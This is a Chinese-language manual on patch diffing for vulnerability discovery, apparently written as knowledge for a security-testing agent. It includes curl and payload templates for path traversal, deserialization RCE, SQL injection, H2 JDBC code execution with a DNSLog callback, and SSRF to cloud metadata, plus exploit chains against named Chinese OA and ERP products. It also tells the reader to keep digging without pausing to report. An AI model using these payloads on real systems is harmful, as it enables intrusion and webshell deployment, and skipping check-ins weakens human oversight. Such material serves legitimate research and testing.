---
name: kb_nday_diff_hunting
description: 补丁 diff 挖 N-day/0-day 专题纵深手册 — 从 patch 到 exp 的完整闭环（版本定位→diff→触发点→PoC→验证），含用友/致远/Fastjson/Spring/通达 真实案例
tags: [补丁diff, N-day, 0-day, 反编译, BinDiff, Diaphora, CVE复现, 漏洞挖掘]
date: 2026-08-14
---

# 补丁 Diff 挖 N-day/0-day 专题手册（patch → exp 全流程）

> 纵向纵深，非概览。概览见 `kb_code_audit_source_2026.md`。本手册覆盖：补丁获取 → 源码/二进制 diff → 触发点定位 → PoC 构造 → 利用验证 → 0day 盲测。所有命令给出可运行形式，关键行带中文注释。

## §0 适用场景与核心思想

- **适用**：拿到目标产品版本号（如用友 U8Cloud V2.7、致远 A8 V8.2、Spring Framework 6.1.13）→ 找对应补丁 → 对比新旧差异 → 从"新增校验"反推"旧版无校验 = 漏洞点"。
- **核心逻辑**：厂商补丁是漏洞的"具象化载体"。补丁加在哪，漏洞就在哪。新增的 `if` 判断、白名单、路径限制、长度检查，十有八九就是修复点。
- **时间窗**：Patch Wednesday → Exploit Wednesday。微软 70% 的漏洞发现者靠补丁对比挖出未公开绕过。
- **优先级**：OA/ERP 系（用友/泛微/致远/通达/帆软）→ Java 组件（Spring/Fastjson/Log4j）→ Windows 内核/浏览器（纯二进制 diff）。国内 SRC 场景前两类是主线。

## §1 补丁获取（4 条渠道，按优先级）

### 1.1 GitHub commit / releases（开源组件首选）

```bash
# 克隆仓库（浅克隆省时间；后续按需 --unshallow）
git clone --depth=200 https://github.com/spring-projects/spring-framework.git
cd spring-framework

# 按关键词定位修复 commit（版本号/CVE号/漏洞函数名）
git log --oneline --all -S "disallowedFields" -- framework-web/src        # -S: 某字符串增删的 commit
git log --oneline --grep="38819" --all                                     # 按 commit message 找 CVE
git log --oneline --grep="path traversal" -i --all

# 关键手法：版本 tag 间直接 diff（如 6.1.13 → 6.1.14）
git diff v6.1.13..v6.1.14 --stat                                            # 先看改了哪些文件
git diff v6.1.13..v6.1.14 -- '*.java' | head -200                          # 精读代码改动
git show <修复commit哈希> --stat                                           # 看单个修复 commit 波及面
git blame -L 120,150 path/to/File.java                                     # 定位某行是谁加的、哪个版本加的
```

**要点**：`-S`（pickaxe）找"某字符串在某 commit 被增/删"；`git log -p` 直接看 commit 的完整 diff；`git bisect` 可定位"哪个 commit 引入/修复漏洞"。

### 1.2 官方补丁包下载 + 反编译（OA/ERP 商业产品首选）

用友/致远/泛微/通达官网或安全中心提供补丁包（多为 jar/war）。补丁包即"新版本"，旧版本从历史安装包拿。

```bash
# 用友安全中心补丁示例（公开公告里带 identifier 与校验码）
# 参考: security.yonyou.com 补丁公告 -> 下载新 jar
# 反编译对比（JD-GUI 图形化 / CFR 命令行）
java -jar cfr.jar new.jar --outputdir ./new_src          # 新版反编译为源码
java -jar cfr.jar old.jar --outputdir ./old_src          # 旧版（历史安装包中提取）
# 源码级 diff（Linux/Mac 或 Git Bash 下）
diff -rq old_src new_src | head -50                      # 列出所有变化的文件
diff -u old_src/nc/bs/framework/server/token/TokenUtil.java \
       new_src/nc/bs/framework/server/token/TokenUtil.java   # 精读关键类差异
```

**要点**：补丁包内改动文件通常很少（3-10 个 jar），`diff -rq` 秒出差异清单。只改 1-2 个方法 = 高价值信号。JD-GUI 无法批量时用 CFR/Fernflower 命令行。

### 1.3 Windows 二进制补丁提取（内核/系统组件）

```bash
# 1) 微软更新目录下载 .msu 累积更新
# 2) 解包（cmd）
expand.exe -F:* .\xxxx.msu .\extract
# 3) 解包 .cab 拿到目标 dll（ntdll/win32k/afd.sys）
expand.exe -F:*.dll .\extract\*.cab .\dlls
# 4) 旧版重建（msu 只含新文件，用 delta 补丁还原旧版，Winbindex 也可直接下历史版）
python delta_patch.py reverse .\dlls\ntdll.dll .\old_ntdll.dll
```

**要点**：Windows 只给累积更新不给单文件，必须用 [Winbindex](https://winbindex.m417z.com/)（按 CVE/版本自动下载新旧二进制）或 delta 逆向。再交给 BinDiff 对比。

### 1.4 镜像与源码检索兜底

```bash
# Gitee 镜像（GitHub 被墙时）: 搜索 "<产品名> mirror" / "<产品名> gitee"
git clone https://gitee.com/mirrors/<product>.git
# 源码搜索引擎（找同类实现/补丁后代码、比对官方是否同步修复）
#   grep.app  —— GitHub 公开仓库正则搜索，免费
#   searchcode —— 4000万+ 项目，可自托管 + MCP server
#   Sourcegraph —— 跨仓库搜索，可私有化
```

### 1.5 版本定位辅助（拿到版本号 → 快速确认影响面）

```bash
# Vulners API 查 CVE 影响版本与修复版本（替换 PRODUCT/VERSION）
curl -s "https://vulners.com/api/v3/search/lucene/?query=CVE-2024-38819" | jq '.data.search[] | {id:.id,title:.title}'
# FOFA/鹰图指纹先定产品与版本: app="泛微-OA（e-cology）" && version="v10"
# 官方公告站: security.yonyou.com / seeyon 官方补丁站 / fanruan 公告 / 各 OA 厂商安全中心
# 本地知识库直查: tools/knowledge_base/srcwiki_poc/ 对应厂商分类 _index.md 拿历史 POC
```

**要点**：版本判断错了方向全错。用指纹（FOFA app 名）+ 页面特征（登录页版权/版本号/静态资源 hash）双确认，再决定去哪个分支找补丁。

## §2 源码级 diff 分析（语义推断）

**口诀：新增校验 = 旧版漏洞点；新增白名单 = 旧版黑名单可绕过；新增长度检查 = 旧版溢出/截断。**

| 补丁改动形态 | 反推漏洞类型 |
|---|---|
| 新增 `if (name == null || name.length()==0) return` | 旧版空值绕过 → 鉴权/NPE 崩溃 |
| 路径处理改 `new File(f).getName()` | 旧版目录穿越 → 任意文件读/写 |
| 增加 `startsWith(白名单前缀)` | 旧版黑名单 → SSRF/JDBC 任意 URL |
| 增加 `toLowerCase(Locale.ROOT)` | 旧版 locale 敏感 → 鉴权绕过（土耳其 i 陷阱） |
| 增加长度/次数限制 | 旧版无限 → DoS / 爆破 |
| 明文黑名单改 hash | 旧版可读黑名单 → 构造绕过 payload |
| 参数改为绑定 DTO 白名单字段 | 旧版全字段绑定 → Mass Assignment |

**实战信号优先级**：涉及反序列化、文件读写、SQL 拼接、URL/连接串、鉴权过滤器的改动 = 立即深挖；纯重构/格式化 = 跳过。

## §3 二进制 diff 分析（无源码时）

### 3.1 工具链

| 工具 | 类型 | 说明 |
|---|---|---|
| BinDiff | 商业(免费版可用) | zynamics/Google，图匹配函数差异，事实标准 |
| Diaphora | 开源 | IDA 插件，伪代码/微码级 diff，免费首选 |
| radiff2 | 开源 | radare2 自带，`radiff2 -C old new` 字节级对比 |
| DiffRays | 开源 | IDA 二进制 diff 引擎，按 CVE 自动下载 Windows 二进制(SQLite 存储) |
| Ghidra + BinDiff 插件 | 开源 | 无 IDA 授权时的替代 |

### 3.2 标准流程（以 Diaphora 为例）

```bash
# 1) IDA 分别加载 old.dll / new.dll，均选 "文件->产生 IDB/i64"
# 2) 分别在 IDA 中: Diaphora -> Export 导出数据库
import diaphora                                            # IDA Python 控制台
diaphora.diff("old.i64", "new.i64", "diff.sqlite")         # 生成 diff 数据库
# 3) 打开 diff.sqlite 查看函数匹配结果
```

**关注清单**：
- 大小变化明显的函数（新增基本块 = 加校验）
- CFG 变化：新增分支、把 `JZ` 改 `JNZ`、新增 `cmp/jle`（边界收紧）
- 危险函数调用点附近：`memcpy/strncpy/HeapAlloc`、`strlen` 后新增长度判断
- 新增跨模块调用（补丁调用了新的验证函数，如 `IsTrustedService`）
- 常量变化（加密算法 key、权限检查字符串）

### 3.3 伪代码对读

```
# IDA 中打开两个窗口分别看 Hex-Rays 伪代码，逐函数对比
# 例: 旧版
char *GetName(void *o) { return o->name; }
# 新版（补丁）:
char *GetName(void *o) {
    if (o->name == NULL) return NULL;        # 新增空指针检查 -> 旧版可传 NULL 触发崩溃/越权
    return o->name;
}
```

### 3.4 BinDiff 命令行与 Diaphora 高级技巧

```bash
# BinDiff 命令行（先 IDA 导出两个 .i64，再 diff）
"$env:ProgramFiles\BinDiff\bin\bindiff.exe" old.i64 new.i64 2>&1 | Out-Null
bindiff --primary old.i64 --secondary new.i64 --output out.BinDiff    # 等价命令行
# 生成文本报告，重点看新增/删除/大小剧变的函数
binbindiff --primary=old.i64 --secondary=new.i64 --output_dir=./rep

# Diaphora 脚本批量对比整个目录（对比多个版本快照）
import diaphora
for v in ["8.2", "8.3", "9.0"]:
    diaphora.diff(f"seeyon_{v}.i64", "seeyon_new.i64", f"diff_{v}.sqlite")
```

**比对策略**：优先"仅在新版存在"的函数（新增校验函数/白名单函数）与"结构大改"的函数（基本块数变化 >20%）。用 Turbolist2 快速跳转到 diff 标记的待审函数。遇到字符串常量变化（URL、权限名、黑名单词），交叉搜索确认是安全逻辑还是业务迭代。

## §2b 反编译/源码对比工具速查

| 场景 | 工具 | 命令/入口 |
|---|---|---|
| Java jar/war 反编译（图形） | JD-GUI | 打开 jar → 一键反编译，File→Save All Sources 批量导出 |
| Java 反编译（命令行/批量） | CFR | `java -jar cfr.jar app.jar --outputdir ./out`（推荐，保真高） |
| Java 反编译（插件） | Fernflower | IDEA 内置；`java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler` |
| 两个版本源码 diff | IDEA Diff | 选中两目录 → `Ctrl+D`；或 `Compare` 目录比较 |
| 目录 diff 命令行 | diff / meld / Beyond Compare | `diff -u old/ new/`；GUI 用 Meld 直观 |
| 大型 Java 工程交叉引用 | IDEA | `Ctrl+Shift+F` 全库搜方法名 → `Ctrl+B` 跳定义 → `Find Usages` 找调用链 |
| 字符串/危险函数批量 grep | ripgrep | `rg -n "readObject|getConnection|FileOutputStream" ./new_src --type java` |

## §4 从 patch 到 exp 完整流程（7 步标准链）

```
版本定位 → 获取 diff → 分析触发点 → 构造 PoC → 验证利用 → 确认影响 → 修复建议
```

1. **版本定位**：确认目标版本号 → 查影响范围（`vulners`/`secrss`/官网公告）→ 找对应补丁。同一产品不同分支补丁不同（Spring 5.3/6.0/6.1 各有修复版本）。
2. **获取 diff**：开源走 §1.1，商业走 §1.2 反编译，内核走 §1.3 + §3。
3. **分析触发点**：逆向 diff 中新改动的方法 → 用 `grep -r "方法名"` 找调用链 → 回溯到 HTTP 入口（Controller/Servlet/Filter）→ 判断参数是否可控、是否需鉴权。
4. **构造 PoC**：按漏洞类型选 payload（SQLi 延时/布尔、反序列化 gadget、路径穿越、JDBC 恶意 URL）。先在本地搭建同版本环境打靶验证。
5. **验证利用**：在目标上最小化探测（延时注入先 `WAITFOR DELAY` 打点；反序列化先 DNSLog 回连确认），确认后走完整链。仅验证不破坏（不删数据、不批量写）。
6. **确认影响**：可复现 + 有实际危害（文件读取到敏感配置 / RCE 出 whoami / 越权读 PII）才定性。
7. **修复建议**：升级补丁版本 / 加白名单 / 端口收敛 / WAF 规则。落报告带完整请求包。

### 4.1 PoC 构造模板（按漏洞类型，拿 diff 结论直接套）

```bash
# 模板① 路径穿越/任意文件读（补丁用 getName() 过滤 → 打旧接口）
curl -s "http://target/seeyon/downloadErrorReport?fileName=..%2F..%2F..%2Fapache-tomcat%2Fconf%2Fserver.xml" -o /tmp/f
# 模板② 反序列化 RCE（补丁加了 token/白名单 → 找绕过或其它入口）
java -jar ysoserial.jar CommonsBeanutils1 "whoami" | base64 -w0          # 生成 payload
#   Shiro 场景用 shirokit.py 一条命令: python shirokit.py scan <url>
#   非 Shiro 用 javachain 64 链: tools/javachain 生成 cookie/body
# 模板③ SQLi 确认（补丁加了参数校验 → 测旧版本未校验点）
curl -s "http://target/cartabletimeline/doList?mtr=1)WAITFOR+DELAY+'0:0:5'--+" -o /dev/null -w "%{time_total}s"
#   正常响应 ~0.1s，延时 5s = 命中（布尔盲注用 AND 1=1 vs AND 1=2 对比）
# 模板④ JDBC 恶意 URL（H2/MySQL 触发任意 SQL/文件读）
curl -s -X POST "http://target/api/dw/connSetting/testConnByBasePassword" \
  -H "Content-Type: application/json" \
  -d '{"url":"jdbc:h2:mem:test;init=CREATE TRIGGER x BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(\"ping <dnslog>\");$$"}'
# 模板⑤ SSRF（补丁限制 host 前缀/内网 IP → 测旧参数名）
curl -s -X POST "http://target/api/fetch" -d '{"url":"http://169.254.169.254/latest/meta-data/"}'  # 云元数据
```

**验证纪律**：先用最小副作用 payload（延时/回连/读单个无害文件）确认漏洞存在，再决定是否升级到完整利用。无回显场景一律配 DNSLog（`tools/dnslog_helper/dnslog.py get` + `watch`）。

## §5 真实案例：patch → exp 全链路复盘

### 5.1 用友 U8Cloud ServiceDispatcherServlet 反序列化→任意文件上传（QVD-2025-33710）

**链路**：`POST /ServiceDispatcherServlet` → 反序列化 `InvocationInfo` → `TokenUtil#vertifyToken` 鉴权 → 调用 `FileTransImpl#uploadFile` 写文件。

**2025-04-03 补丁 diff 三处改动（反编译对比）**：

| 位置 | 补丁前 | 补丁后 | 反推漏洞 |
|---|---|---|---|
| `TokenUtil` 构造 | 读 `tokenSeed.conf`，种子硬编码 `ab7d823e-...` | 读 `Tenant.properties` 的 tenantId | 硬编码种子 → 伪造 token 绕过鉴权 |
| `trustServiceList.conf` | 无/宽松 | 加可信服务名单 | 任意服务调用 |
| `FileTransImpl#uploadFile` | 可写任意路径（含 web 目录） | 限定非 web 目录 | 任意文件上传 → getshell |

**2025-08 补丁绕过（0day 思路范例）**：官方只修了 `uploadFile` 的路径限制，没修"文件移动方法"。攻击者调用文件移动接口把 JSP 从非 web 目录挪进 web 目录 → 变相 getshell。**教训：补丁只堵一个入口 = 同链其它入口仍通。**

```bash
# 验证思路（授权目标）：先打 token 绕过拿合法会话，再测移动接口
# 反序列化三种打法：①无 token 直打 ②硬编码种子伪造 token ③在 InvocationInfo 参数内嵌恶意对象，触发 readObject 完全绕 token
```

### 5.2 致远 OA 补丁绕过与任意文件读（A8 系）

- **前台密码重置补丁绕过**：官方给 rest 重置密码接口加了权限校验，但 `CTPSecurityFilter.doFilter` 对 `.do` 后缀走 `SpringControllerAuthenticator`（老校验）。攻击者用 `xxx.do` 后缀 + rest 请求格式 → 绕过补丁重置内置账号（`system`/`audit-admin`）→ 配 ZipSlip（zip 内 `../` 未过滤）上传 webshell。**教训：补丁加在校验入口 ≠ 覆盖所有路由分支，URI 后缀差异是经典绕过面。**
- **AIEdocCorrectController 任意文件读**：`downloadErrorReport` 的 `fileName` 参数目录穿越，`IOUtility.copy` 无过滤。**补丁一行修复：`fileName = new File(fileName).getName()`** —— 正是 §2 表格里的典型模式，遇到这种改动直接想到"旧版任意文件读"。

### 5.3 Fastjson 补丁演进史（最经典的"补丁→绕过"螺旋）

| 版本 | 补丁动作 | 绕过 | 本质 |
|---|---|---|---|
| 1.2.25 | 引入 `checkAutoType` + 黑名单 | `Lcom.sun...;` JNI 描述符包裹 | 校验只看前后字符 |
| 1.2.42 | 剥一层 `L;` | `LLcom.sun...;;` 双写 | 只剥一层 → 再包一层 |
| 1.2.47 | 缓存绕过 | 先缓存类再加载 | 校验与加载分离 |
| 1.2.68 | 明文黑名单 → hash 存储 | 彩虹表还原 hash + `expectClass`/`AutoCloseable` 绕过（无需开 AutoType） | 名单可逆 |
| 1.2.83 | "安全终点"声明 | `@JSONType` 注解探测链：`..`→`//` 使类名变 URL → jar:http 拉远端类 → RCE（CVSS 9.8，无需 AutoType） | 校验逻辑被字符串转换绕过 |

**Fastjson2 2.0.61 RCE（修复 2.0.63）**：黑白名单改 FNV-1a 64 位哈希匹配，**哈希碰撞可构造**（追加 8-12 字节自由字符），命中后 `loadClass` 加载整个 `@type` 串，`jar:http://...` 即远程 jar。

**对研究者的启示**：每次官方 patch 都暴露"上一版校验的具体缺陷"，把 patch 列表串起来 = 拿到该产品的完整安全模型，新版本盲测就照这个清单打。

### 5.4 Spring Framework 2024 批量（CVE-2024-38819 等）

- **CVE-2024-38819 路径穿越**：WebMvc.fn/WebFlux.fn 静态资源服务，`%252e%252e%252f` 双重 URL 解码变 `../`。补丁在解码后追加规范化校验。**复现**：`GET /static/%252e%252e%252fWEB-INF/web.xml`。影响 5.3.0-5.3.40 / 6.0-6.0.24 / 6.1.0-6.1.13，修于 5.3.41/6.0.25/6.1.14。
- **CVE-2024-38820 鉴权绕过**：官方为修 CVE-2022-22968 用了 `String.toLowerCase()` 做大小写不敏感匹配，但 locale 不同结果不同（土耳其 i）。补丁改 `toLowerCase(Locale.ROOT)`。**教训：补丁自己引入新漏洞 = 关注补丁的补丁。**

```bash
# 本地复现: git checkout v6.1.13 起 spring-webmvc 简单静态资源服务
git diff v6.1.13..v6.1.14 -- framework-web/ | grep -i "decode\|normalize\|getPath"
```

### 5.5 泛微 e-cology v10 前台 RCE（appThirdLogin → H2 JDBC 反序列化）

**链路（多步组合拳）**：`/papi/passport/rest/appThirdLogin` 传入 `username=sysadmin` 直接拿 `serviceTicketId` → 换 `ETEAMSID` 进后台（免密）→ `/api/bs/iaauthclient/base/save` 配置 `ruleClass=org.h2.Driver` → `/api/dw/connSetting/testConnByBasePassword` 构造 H2 恶意 JDBC URL（`INIT` 触发器执行 JS/Java）→ RCE。

**补丁视角**：该链能成立的前提是"第三方登录接口无强校验" + "JDBC 连接串/驱动类完全可控"。若官方补丁只堵 `appThirdLogin`（加账号白名单/二次校验），那么后台 H2 配置入口仍可复用（配合其它鉴权绕过）；若只限制 `jdbc:h2` 前缀，则换 `jdbc:mysql` / `jdbc:postgresql` 的恶意 payload（如读文件、`allowLoadLocalInfile`）继续打。**对照致远 S1 的 H2 修复（限制前缀）——两家产品同款漏洞模式，验证"跨产品共性"思路。**

**FOFA 指纹**：`app="泛微-OA（e-cology）"`。影响 v10 全系。修复方向：第三方登录白名单 + JDBC 前缀/驱动类白名单 + 后台接口加权限。

### 5.6 通达 OA / 帆软上传绕过速览

- **通达**：附件上传改存储目录时检测 `webroot` 关键词 → **大小写绕过** `D:\MYOA\webrooT`；黑名单过滤 → **Windows 尾缀点特性**传 `shell.php.` 落盘 `shell.php`。T10-17 链：附件上传 → 存储目录改 web 根 → getshell。
- **帆软**：`export/excel` SQL 注入 → webshell；`channel` 接口反序列化（<11.0 / FineBI<5.1）；`DecisionInterceptor` 鉴权校验用 `getTempAuthValidatorStatus` 返回 `null` 元素绕过。影响 FineReport<11.5.4.1 / FineBI 多个版本。

## §6 触发点定位技巧（从补丁反向找入口）

1. **调用链回溯**：拿到补丁改动的方法名 → 全库 grep → 谁调用了它 → 逐层向上到 HTTP 入口。

```bash
# 反编译源码目录下
grep -rn "uploadFile\|downloadErrorReport\|testDBConnect" ./new_src --include=*.java
grep -rn "class.*Servlet\|@Controller\|@RequestMapping" ./new_src/nc/bs/.../ -l | head   # 找入口
```

2. **危险函数调用点**：补丁新增校验往往紧挨危险函数。`grep` 反序列化入口：`ObjectInputStream` / `readObject` / `resolveClass`；文件：`FileOutputStream` / `FileWriter` / `transferTo`；SQL：`Statement.execute` / `${}` 拼接；连接串：`DriverManager.getConnection` / `Class.forName(driver)`。
3. **参数可控性**：入口方法签名中哪些参数来自 HTTP（路径参数、body 字段、header）→ 逐个标"可控/半可控/不可控"。**可控 + 直达补丁点 = 可利用。**
4. **鉴权边界**：看过滤器链（如致远的 `CTPSecurityFilter`）哪些 URI 免登录（`@NeedlessCheckLogin`）、哪些走弱校验。免登录入口 = 前台洞；需登录 = 后台洞（配合密码重置/越权打通）。

### 6.1 完整走查示例：从补丁一行改动到入口

以用友 U8Cloud 补丁改动 `TokenUtil` 为例：

```bash
# 1) diff 发现补丁改了 TokenUtil（硬编码种子 -> 读 Tenant.properties）
diff -u old_src/.../TokenUtil.java new_src/.../TokenUtil.java

# 2) 全库找谁 new/引用 TokenUtil（定位鉴权调用点）
rg -n "TokenUtil|vertifyToken" ./new_src --type java

# 3) 从鉴权方法向上回溯到 Servlet 入口
rg -ln "ServiceDispatcherServlet|CommonServletDispatcher" ./new_src --type java
#  -> 入口: POST /ServiceDispatcherServlet
#  -> 流程: doPost -> execCall -> 反序列化 InvocationInfo -> vertifyToken(token)
#  -> 关键: token 由用户名+种子 MD5 得到，种子硬编码 => 伪造 token 过鉴权

# 4) 确认参数可控性: InvocationInfo 里 methodName/args 全来自反序列化流
# 5) 画攻击图: 伪造token -> 调用 FileTransImpl#uploadFile -> 写 jsp 到 web 目录
```

**通用回溯模板**：`补丁改动类` → `rg 谁调用它` → `从调用方法向上找 Controller/Servlet` → `确认该入口 HTTP 方法+参数名` → `看过滤器链是否放行` → `本地起同版本复现`。整个流程 10 分钟内可跑完，是补丁挖洞最高产出的一步。

### 6.2 危险函数调用点快速清单

```bash
rg -n "readObject|ObjectInputStream"  ./new_src --type java     # 反序列化
rg -n "FileOutputStream|new File\(|write\("  ./new_src --type java  # 文件写
rg -n "createStatement|executeQuery|executeUpdate|\$\{" ./new_src --type java  # SQL
rg -n "DriverManager|getConnection|Class\.forName" ./new_src --type java      # JDBC/驱动加载
rg -n "URLDecoder\.decode|URI\.resolve|\.normalize\(" ./new_src --type java  # 编码/路径规范化
rg -n "exec\(|ProcessBuilder|Runtime" ./new_src --type java    # 命令执行
```

命中点若与补丁改动文件同包/相邻 → 直接对照补丁上下文确认是否新增校验。

## §7 常见坑与绕过

| 坑 | 说明 | 对策 |
|---|---|---|
| **版本差异** | 同一产品不同分支补丁不同（Spring 5.3/6.0/6.1），厂商可能只修高版本 | 先确认目标版本在影响范围；多分支 diff 都要看 |
| **环境依赖** | 反序列化链依赖第三方库版本（CB/CC 版本），本机复现失败 ≠ 目标不可利用 | 用 javachain 多链遍历（BeanShell/Groovy/Rome），按目标 pom/依赖猜链 |
| **patch 不完全** | 只堵一个入口（用友移动接口、致远 .do 后缀）| 修哪补哪 → 同功能其它接口、URI 变体、参数变体继续测 |
| **厂商静默修复** | 不发公告直接改版本，或只在新版修不回头修旧版 | 对比相邻版本 release note；diff 新老两个最新版 |
| **补丁引入新洞** | Spring toLowerCase locale 陷阱 | 关注"补丁的补丁"，新校验本身就是新攻击面 |
| **WAF 拦 PoC** | 注入/路径穿越被拦 | 换 Content-Type、双重编码 `%252e`、HPP、大小写、`%09`/`%0a` 分隔 |
| **回显判断误差** | 报错差异非漏洞证据 | 用 DNSLog/延时打点，回连 IP=目标出口 IP 才算实证 |

## §8 0-day 思路：历史 N-day → 共性模式 → 新版本盲测

1. **提取产品共性漏洞模式**：把该厂商/该系列的历史 N-day 漏洞清单化，找共性。用友系 = 反序列化入口多 + 硬编码 token/密钥；致远系 = 鉴权过滤器路由分支多 + ZipSlip；泛微系 = 第三方登录接口弱校验 + JDBC 驱动可控；Fastjson 系 = 名单机制永远可绕过。
2. **回归测试清单**：给"同产品新版本"直接打历史 payload 变体（老链套新壳、老接口换新参数名）——**很多"新 0day"就是老漏洞的命名/参数/入口换皮**。把历史 POC 的 URL 路径、参数名、payload 存成清单，新版本逐条重放，比对响应差异。
3. **相邻功能盲测**：补丁修了 A 功能，相邻 B 功能（同代码模板复制）大概率同款漏洞 → 直接照 A 的 payload 打 B。
4. **补丁的补丁**：新校验本身就是线索。比如 U8Cloud 把明文黑名单改 hash，就猜"hash 可还原"；把路径限制到非 web 目录，就猜"移动/重命名接口未限制"；把 `uploadFile` 限制住，就猜"其它 FileTrans 方法没限制"。
5. **验证纪律**：盲测新版本前先跑 §0 判别式（能复现老 N-day 吗）确认版本未修复方向，再决定打补丁的哪个薄弱点。

### 8.1 盲测工作流（一条命令流水线）

```bash
# 1) 老 N-day POC 清单（tools/knowledge_base/srcwiki_poc/对应厂商 _index.md 提取）
# 2) 逐条重放，记录响应差异
for p in $(cat old_pocs.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$p")
  size=$(curl -s "$TARGET$p" | wc -c)
  echo "$p -> HTTP $code, size $size"
done
# 3) 关注"应修复却仍 200/异常响应"的路径 = 补丁没覆盖的入口
# 4) 命中 -> 进 §4 完整验证；未命中 -> 打历史 payload 变体（改参数名/加大小写/URL 编码）
# 5) 变体仍无 -> 回到最新补丁 diff，找"补丁只堵 A 没堵 B"的相邻函数继续
```

### 8.2 跨产品共性 0day（速查）

| 共性模式 | 已证实产品 | 盲测新目标思路 |
|---|---|---|
| 第三方/SSO 登录接口弱校验 | 泛微 appThirdLogin、致远 S1、用友 | 找各 OA 的 `/papi`、`/rest`、`sso`、`third` 前缀接口，试免密/默认账号 |
| 后台 JDBC 连接串可控 → H2/MySQL 恶意 URL | 泛微、致远 S1、帆软 | 找"数据源测试连接/数据库管理"后台接口，`driver/url` 参数打 JDBC payload |
| 附件 zip 解压目录穿越（ZipSlip） | 致远、通达 | 找任意"导入 zip/导入备份"功能，包内 `../` 打 webshell |
| 文件上传黑名单绕过（尾缀点/大小写/双写） | 通达、用友 | 传 `shell.php.` / `shell.php%00` / `shell.PhP`，结合 Windows 文件名特性 |
| 反序列化入口 + 白名单只查首对象 | 用友 FileManageServlet | 序列化流内多对象，首对象放白名单类、次对象放危险类 |
| 编码/解码不一致（双重 URL 解码） | Spring CVE-2024-38819 | 全站静态资源/下载参数补测 `%252e%252e%252f` |

## §9 判定门槛（与全局规则对齐）

只同时满足以下才定性：
1. **可复现**：稳定触发，不依赖偶然状态/缓存
2. **有利用链**：从入口到危害的完整路径（不只是单个配置点/单次异常）
3. **明确影响**：真实数据/权限/资金/可用性（拿到敏感文件、RCE 回显、越权读 PII）
4. **实证**：完整请求/响应 + 触发条件；无回显场景用 DNSLog/延时取证（回连 IP=目标出口 IP）

**不得定性**：仅 diff 发现"可疑改动"未验证；纯理论链；只报错无数据；低价值信息泄露；无利用链的配置点。未达门槛就继续深挖下一个链路，不暂停汇报。

## §10 Sources

- Akamai Patch Wednesday / PatchDiff-AI 研究: https://www.akamai.com/blog/security-research/2025/dec/patch-wednesday-root-cause-analysis-with-llms
- The Register: AI 从补丁构造 CVE-2025-32433 exp（无 diff 则无 exp）: https://www.theregister.com/special-features/2025/04/21/ai-models-can-generate-exploit-code-at-lightning-speed/
- DiffRays（二进制 patch diff 引擎）: https://github.com/pwnfuzz/diffrays
- PatchLeaks（从 patch 到 PoC）: https://github.com/hatlesswizard/PatchLeaks
- Diaphora: https://github.com/joxeankoret/diaphora
- Winbindex: https://winbindex.m417z.com/
- 用友 U8Cloud ServiceDispatcherServlet 反序列化补丁绕过（先知社区）: https://xz.aliyun.com/news/90697
- 用友 U8Cloud 文件上传漏洞通告（secrss）: https://www.secrss.com/articles/82662
- 致远 OA 前台 RCE 组合拳（cn-sec）: http://cn-sec.com/archives/2554821.html
- 致远 OA 漏洞分析（cn-sec）: https://cn-sec.com/archives/4855183.html
- 致远 A8 SSRF2RCE（长亭 Joern 实战）: https://rivers.chaitin.cn/blog/cq950tp0lnechd244gi0
- Fastjson 历史补丁绕过系列: https://lintian31.github.io/2025/04/29/Java-Fastjson历史补丁绕过（一）/
- Fastjson 1.2.83 @JSONType 探测链（奇安信攻防社区）: https://mdr.skyeye.qianxin.com/forum/share/4992
- Fastjson fd bridge 两阶段利用（FreeBuf）: https://www.freebuf.com/articles/web/491940.html
- Spring CVE-2024-38819 等公告: https://vulners.com/nessus/SPRING_CVE-2024-38819.NASL
- 通达 OA 前台任意文件上传/包含 getshell: https://chajianwo.com/blog-32391.html
- 帆软 export/excel SQLi 与 Webshell（先知社区）: https://xz.aliyun.com/news/90947
- grep.app: https://grep.app ｜ searchcode: https://searchcode.com ｜ Sourcegraph: https://sourcegraph.com
